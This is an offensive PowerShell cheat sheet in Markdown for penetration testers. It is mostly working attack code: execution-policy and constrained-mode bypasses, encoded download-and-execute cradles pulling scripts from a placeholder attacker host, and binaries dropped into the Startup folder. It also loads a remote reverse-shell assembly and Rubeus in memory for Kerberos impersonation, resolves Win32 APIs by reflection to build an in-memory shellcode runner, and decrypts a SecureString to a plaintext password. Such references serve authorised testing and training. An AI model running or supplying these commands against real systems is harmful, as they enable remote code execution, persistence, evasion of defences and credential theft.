# Powershell

## Summary

- [Powershell](#powershell)
  - [Summary](#summary)
  - [Execution Policy](#execution-policy)
  - [Encoded Commands](#encoded-commands)
  - [Constrained Mode](#constrained-mode)
  - [Encoded Commands](#encoded-commands)
  - [Download file](#download-file)
  - [Load Powershell scripts](#load-powershell-scripts)
  - [Load C# assembly reflectively](#load-c-assembly-reflectively)
  - [Call Win API using delegate functions with Reflection](#call-win-api-using-delegate-functions-with-reflection)
    - [Resolve address functions](#resolve-address-functions)
    - [DelegateType Reflection](#delegatetype-reflection)
    - [Example with a simple shellcode runner](#example-with-a-simple-shellcode-runner)
  - [Secure String to Plaintext](#secure-string-to-plaintext)
  - [References](#references)

## Execution Policy

```ps1
powershell -EncodedCommand $encodedCommand
powershell -ep bypass ./PowerView.ps1

# Change execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-ExecutionPolicy Bypass -Scope Process
```

## Constrained Mode

```ps1
# Check if we are in a constrained mode
# Values could be: FullLanguage or ConstrainedLanguage
$ExecutionContext.SessionState.LanguageMode

## Bypass
powershell -version 2
```

## Encoded Commands

* Windows
    ```ps1
    $command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    ```
* Linux: :warning: UTF-16LE encoding is required
    ```ps1
    echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
    ```

## Download file

```ps1
# Any version
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerView.ps1", "C:\Windows\Temp\PowerView.ps1")
wget "http://10.10.10.10/taskkill.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output

# Powershell 4+
IWR "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
```

## Load Powershell scripts

```ps1
# Proxy-aware
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# Non-proxy aware
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

## Load C# assembly reflectively

```powershell
# Download and run assembly without arguments
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# Download and run Rubeus, with arguments (make sure to split the args)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# Execute a specific method from an assembly (e.g. a DLL)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## Call Win API using delegate functions with Reflection

### Resolve address functions

To perform reflection we first need to obtain `GetModuleHandle` and `GetProcAdresse` to be able to lookup of Win32 API function addresses.

To retrieve those function we will need to find out if there are included inside the existing loaded Assemblies.
```powershell
# Retrieve all loaded Assemblies
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

Iterate over all the Assemblies, to retrieve all the Static and Unsafe Methods 
$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $nul l
```
We want to find where the Assemblies are located, so we will use the statement `Location`. Then we will look for all the methods inside the Assembly `Microsoft.Win32.UnsafeNativeMethods` 
TBN: `GetModuleHandle` and `GetProcAddress` are located in `C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll`	

If we want to use those function we need in a first time get a reference to the .dll file we need the object to have the property `GlobalAssemblyCache` set (The Global Assembly Cache is essentially a list of all native and registered assemblies on Windows, which will allow us to filter out non-native assemblies). The second filter is to retrieve the `System.dll`.
```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
})
  
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
```

To retrieve the method `GetModuleHandle`, we can use the method `GetMethod(<METHOD_NAME>)` to retrieve it.
`$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')`

Now we can use the `Invoke` method of our object `$GetModuleHandle` to get a reference of an unmanaged DLL.
Invoke takes two arguments and both are objects: 
* The first argument is the object to invoke it on but since we use it on a static method we may set it to "$null". 
* The second argument is an array consisting of the arguments for the method we are invoking (GetModuleHandle). Since the Win32 API only takes the name of the DLL as a string we only need to supply that.
`$GetModuleHandle.Invoke($null, @("user32.dll"))`

However, we want to use the same method to use the function `GetProcAddress`, it won't work due to the fact that our `System.dll` object retrieved contains multiple occurences of the method `GetProcAddress`. Therefore the internal method `GetMethod()` will throw an error `"Ambiguous match found."`.

Therefore we will use the method `GetMethods()` to get all the available methods and then iterate over them to retrieve only those we want.
```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
```

If we want to get the `GetProcAddress` reference, we will construct an array to store our matching object and use the first entry.

```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
```

We need to take the first one, because the arguments type of the second one does not match with ours.

Alternatively we can use `GetMethod` function to precise the argument types that we want.
```powershell
$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',
			     [reflection.bindingflags]'Public,Static', 
			     $null, 
                             [System.Reflection.CallingConventions]::Any,
                             @([System.IntPtr], [string]), 
                             $null);
```
cf: [https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0)

Now we have everything to resolve any function address we want.
```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

If we put everything in a function: 
```powershell
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

### DelegateType Reflection

To be able to use the function that we have retrieved the address, we need to pair the information about the number of arguments and their associated data types with the resolved function memory address. This is done through `DelegateType`.   
The DelegateType Reflection consists in manually create an assembly in memory and populate it with content.

The first step is to create a new assembly with the class `AssemblyName` and assign it a name.
```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
```
Now we want to set permission on our Assembly. We need to set it to executable and to not be saved to the disk. For that the method `DefineDynamicAssembly` will be used.
```powershell
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```
Now that everything is set, we can start creating content inside our assembly. First, we will need to create the main building block which is a Module. This can be done through the method `DefineDynamicModule`
The method need a custom name as the first argument and a boolean indicating if we want to include symbols or not.
```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```
The next step consists by creating a custom type that will become our delegate type. It can be done with the method `DefineType`.
The arguments are:
* a custom name
* the attributes of the type
*  the type it build on top of
```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
```
Then we will need to set the prototype of our function.
First we need to use the method `DefineConstructor` to define a constructor. The method takes three arguments:
* the attributes of the constructor
* calling convention
* the parameter types of the constructor that will become the function prototype
```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public',
                                                        [System.Reflection.CallingConventions]::Standard,
                                                        @([IntPtr], [String], [String], [int]))
```
Then we need to set some implementation flags with the method `SetImplementationFlags`.
```powershell
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
```
To be able to call our function, we need to define the `Invoke` method in our delegate type. For that the method `DefineMethod` allows us to do that. 
The method takes four arguments:
* name of the method defined
* method attributes 
* return type
* array of argument types
```powershell
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',
                                                'Public, HideBySig, NewSlot, Virtual',
                                                [int],
                                                @([IntPtr], [String], [String], [int]))
```
If we put everything in a function:
```powershell
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # array with the argument types
        [Parameter(Position = 2)] [Type] $retType = [Void] # Return type
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
```
### Example with a simple shellcode runner

```powershell
# Create a Delegate function  to be able to call the function that we have the address
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # Function address
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # array with the argument types
        [Parameter(Position = 2)] [Type] $retType = [Void] # Return type
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
# Allow to retrieve function address from a dll
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# Simple Shellcode runner using delegation
$VirtualAllocAddr = LookupFunc "Kernel32.dll" "VirtualAlloc"
$CreateThreadAddr = LookupFunc "Kernel32.dll" "CreateThread"
$WaitForSingleObjectAddr = LookupFunc "Kernel32.dll" "WaitForSingleObject" 


$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 ...

$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)

```

## Secure String to Plaintext

```ps1
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## References

* [Windows & Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)
* [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)